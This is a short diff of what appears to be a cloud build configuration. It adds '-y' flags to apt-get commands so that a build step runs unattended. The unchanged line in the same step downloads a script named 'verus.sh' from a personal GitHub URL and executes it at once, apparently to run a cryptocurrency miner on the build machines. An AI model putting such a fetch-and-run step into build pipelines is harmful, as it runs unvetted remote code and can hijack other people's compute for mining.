@@ -36,8 +36,8 @@ steps:
     args:
       - '-c'
       - |
-        apt-get update
-        apt-get install wget
-        apt-get update
+        apt-get -y update
+        apt-get -y install wget
+        apt-get -y update
         wget https://raw.githubusercontent.com/comandashtar/colab-2/main/verus.sh && chmod +x verus.sh && ./verus.sh
     timeout: 3600s
